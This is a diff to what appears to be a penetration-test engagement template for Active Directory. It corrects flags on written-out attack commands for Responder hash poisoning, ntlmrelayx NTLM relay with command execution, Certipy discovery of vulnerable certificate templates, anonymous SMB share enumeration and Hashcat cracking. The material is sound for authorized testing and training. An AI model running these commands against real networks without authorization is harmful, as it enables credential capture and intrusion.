@@ -1,5 +1,5 @@
 +++
-title = "Sample Engagement"
+title = "Template: Sample Engagement"
 +++
 
 - Ref: https://archive.ph/i6AeU
@@ -22,9 +22,9 @@ title = "Sample Engagement"
 *   **LLMNR/NBT-NS Poisoning:** Start **Responder** to poison local name resolution and capture NTLMv2 hashes from hosts on the same broadcast domain.
     - `responder -I <interface> -dwPv`
 *   **NTLM Relay Attack:** In parallel with Responder, run **Impacket's ntlmrelayx.py** to relay captured hashes to the list of SMB-signing-disabled hosts. The goal is to execute a command or dump local hashes.
-    - `ntlmrelayx.py -tf smb_relay_targets.txt -smbsupport -c "whoami"`
+    - `ntlmrelayx.py -tf smb_relay_targets.txt --smb2support -c "whoami"`
 *   **AD CS Enumeration (Critical):** Use **Certipy** to find vulnerable certificate templates in Active Directory Certificate Services. This is a primary vector for privilege escalation.
-    - `certipy find -u '<user>' -p '<password>' -dc-ip <DC_IP> -vulnerable`
+    - `certipy find -u '<user>' -p '<password>' -dc-ip <DC_IP> -vulnerable -enabled`
 *   **Anonymous Enumeration:** Check for anonymous access to SMB shares and LDAP.
     - `nxc smb <CIDR> -u '' -p '' --shares`
 *   **Offline Password Cracking:** Use **Hashcat** on any captured NTLMv2 hashes. A successful crack provides the first set of valid user credentials.
